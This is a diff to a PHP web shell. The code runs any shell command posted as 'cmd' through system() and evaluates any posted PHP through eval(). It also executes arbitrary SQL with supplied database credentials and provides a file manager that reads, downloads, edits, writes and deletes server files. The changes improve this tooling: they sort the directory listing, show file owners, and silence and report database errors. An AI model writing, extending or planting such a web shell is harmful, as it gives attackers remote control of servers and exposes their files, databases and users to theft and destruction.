@@ -1,4 +1,5 @@
 <?php
+ini_set('display_errors', 1);
 error_reporting(E_ERROR);
 $dark = false;
 
@@ -56,7 +57,7 @@ function GetSize($b)
     return round($b,2) . $u[$i];
 }
 
-if(!empty($_POST['cmd'])) { echo "<pre>"; system($_POST['cmd']); echo "</pre>"; }
+if(!empty($_POST['cmd'])) { echo "<pre class='c'>"; system($_POST['cmd']); echo "</pre>"; }
 
 if(!empty($_POST['php'])) { echo '<pre>'; eval($_POST['php']); echo '</pre>'; }
 
@@ -91,48 +92,62 @@ if(!empty($_POST['query']))
 	else $dsn = $_POST['dbms'] . ':dbname='. $_POST['db'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];
 	
 	$dbh = new PDO($dsn, $_POST['user'], $_POST['pwd']);
+	$dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
 	$stmt = $dbh->query($_POST['query']);
 
-	echo '<table border="1"><tr>';
-	for ($i = 0; $i < $stmt->columnCount(); $i++) { $col = $stmt->getColumnMeta($i); echo '<td><b>'. $col['name'] .'</b></td>'; }
-	echo '</tr>';
-
-	while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
-		echo '<tr>';
-		foreach ($row as $value) echo '<td>'. $value .'</td>';
+	if ($stmt) {
+		echo '<table border="1"><tr>';
+		for ($i = 0; $i < $stmt->columnCount(); $i++) { $col = $stmt->getColumnMeta($i); echo '<td><b>'. $col['name'] .'</b></td>'; }
 		echo '</tr>';
+
+		while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
+			echo '<tr>';
+			foreach ($row as $value) echo '<td>'. $value .'</td>';
+			echo '</tr>';
+		}
+		echo '</table>';
 	}
-	echo '</table>';
+	else echo '<b>Error '. $dbh->errorInfo()[1] .' : '. $dbh->errorInfo()[2] . '</b>';
 }
 
 $dir = !empty($_GET['dir']) ? $_GET['dir'] : '.';
+$tab = scandir($dir);
 
-if ($dir)
+$dirs = array();
+$files = array();
+for ($i=0; $i < sizeof($tab); $i++) { 
+	if (is_dir($dir . '/' . $tab[$i])) $dirs[] = $tab[$i];
+	else $files[] = $tab[$i];
+}
+sort($dirs, SORT_STRING | SORT_FLAG_CASE);
+sort($files, SORT_STRING | SORT_FLAG_CASE);
+$tab = array_merge($dirs, $files);
+
+if ($tab) 
 {
-	$tab = scandir($dir);
-	if ($tab) 
+	echo "<br><br><b>Listing of " . GetPath($dir) . '</b><br><br><div style="min-width: 600px">';
+	$i = 0;
+	foreach ($tab as $x)
 	{
-		echo "<br><br><b>Listing of " . GetPath($dir) . '</b><br><br><div style="min-width: 600px">';
-		$i = 0;
-		foreach ($tab as $x)
-		{
-			$f = $dir.'/'.$x;
-			echo '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'"><c1>';
-			echo GetPerms(fileperms($f)) . ' </c1><c2>';
-			if (is_dir($f)) echo $x . "</c2><c1></c1><c4> [<a href='$f'>open URL</a>] [<a href='?dir=$f'>browse</a>]";
+		$f = $dir.'/'.$x;
+		echo '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'">';
+		echo '<c1>' . GetPerms(fileperms($f)) . ' </c1>' .
+		'<c2>'. posix_getpwuid(fileowner($f))['name'] . ':' . posix_getpwuid(filegroup($f))['name'] . '</c2>' .
+		'<c2>' . $x . '</c2>';
 
-			else echo $x . "</c2><c1> (". GetSize(filesize($f)) .") </c1><c4>
-							[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>] 
-							[<a href='?dir=$dir&dl=$f'>download</a>] [<a href='?dir=$dir&edit=$f'>edit</a>] 
-							[<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]";
-			
-			echo '</c4></div>';
-		}
+		if (is_dir($f)) echo "<c1></c1><c6> [<a href='$f'>open URL</a>] [<a href='?dir=$f'>browse</a>] </c6>";
+
+		else echo '<c1>'. GetSize(filesize($f)) .'</c1>' .
+					"<c6>[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>] 
+					[<a href='?dir=$dir&dl=$f'>download</a>] [<a href='?dir=$dir&edit=$f'>edit</a>] 
+					[<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]</c6>";
+		
 		echo '</div>';
 	}
-	else
-		echo "<b>Can't open directory ". $dir ."</b>";
+	echo '</div>';
 }
+else
+	echo "<b>Can't open directory ". $dir ."</b>";
 
 
 $f = $c = '';
@@ -164,10 +179,10 @@ Read <input type="text" name="read" placeholder="file"><input type="submit">
 </form><br>
 <form action="?dir=<?=$dir;?>" METHOD="POST">
 Write <input type="text" name="write" placeholder="file" value="<?=$f; ?>"><br>
-<textarea name="content" cols="100" rows="10" placeholder="content"><?=$c; ?></textarea><input type="submit">
+<textarea name="content" cols="80" rows="5" placeholder="content"><?=$c; ?></textarea><input type="submit">
 </form><br>
 <form action="?dir=<?=$dir;?>" METHOD="POST">
-SQLquery<br>
+
 <select name="dbms">
 	<option>mysql</option>
 	<option>sqlite</option>
@@ -177,8 +192,8 @@ SQLquery<br>
 <input type="text" name="server" value="<?=(!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1'; ?>">
 <input type="text" name="port" value="<?=(!empty($_POST['port'])) ? $_POST['port'] : '3306'; ?>"><br>
 <input type="text" name="user" value="<?=(!empty($_POST['user'])) ? $_POST['user'] : 'root'; ?>">
-<input type="text" name="pwd" value="<?=$_POST['pwd']; ?>" placeholder="password"><br>
-<input type="text" name="db" value="<?=$_POST['db']; ?>" placeholder="database"><br>
+<input type="text" name="pwd" value="<?=(!empty($_POST['pwd'])) ? $_POST['pwd'] : ''; ?>" placeholder="password"><br>
+<input type="text" name="db" value="<?=(!empty($_POST['db'])) ? $_POST['db'] : ''; ?>" placeholder="database"><br>
 <textarea name="query" cols="80" rows="5" placeholder="query"></textarea><input type="submit">
 </form>
 </body></html>
